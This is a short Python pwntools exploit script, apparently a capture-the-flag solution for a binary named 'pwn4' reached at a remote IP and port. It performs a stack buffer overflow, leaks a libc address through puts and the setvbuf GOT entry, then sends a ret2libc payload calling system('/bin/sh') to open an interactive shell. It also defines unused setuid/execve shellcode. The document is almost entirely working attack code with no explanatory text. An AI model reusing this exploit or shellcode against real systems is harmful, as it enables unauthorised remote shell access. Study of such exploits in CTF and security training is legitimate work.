from pwn import *


shellcode="\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"

#p=process("./pwn4")
p=remote("34.251.66.45",13374)
puts_plt=0x8048360
setvbuf_got=0x0804a018
lOL=0x080484d6
payload=""
payload+="A"*28

payload+=p32(puts_plt)
payload+=p32(lOL)
payload+=p32(setvbuf_got)
p.recvline()
p.sendline(payload)
leak=p.recvline()[:-1]
leak=u64(leak.ljust(8,"\x00"))
print hex(leak)
base=leak-0x067ac0
system=base+0x03cd10
bin_sh=base+0x17b8cf

print "base :",hex(base)

print "system :",hex(system)
print "bin_sh :",hex(bin_sh)

payload=""
payload+="A"*28
payload+=p32(system)
payload+="JUNK"
payload+=p32(bin_sh)
p.sendline(payload)
p.interactive()